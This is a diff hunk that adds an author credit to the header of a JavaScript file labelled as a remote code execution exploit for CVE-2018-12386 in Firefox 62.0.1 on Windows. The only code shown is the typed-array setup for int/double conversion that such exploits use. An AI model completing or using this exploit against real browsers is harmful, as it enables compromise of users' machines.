@@ -1,5 +1,7 @@
 // RCE exploit for CVE-2018-12386
 // Firefox 62.0.1 Windows
+// 
+// Exploit by saelo & niklasb
 var convert = new ArrayBuffer(0x100);
 var u32 = new Uint32Array(convert);
 var f64 = new Float64Array(convert);
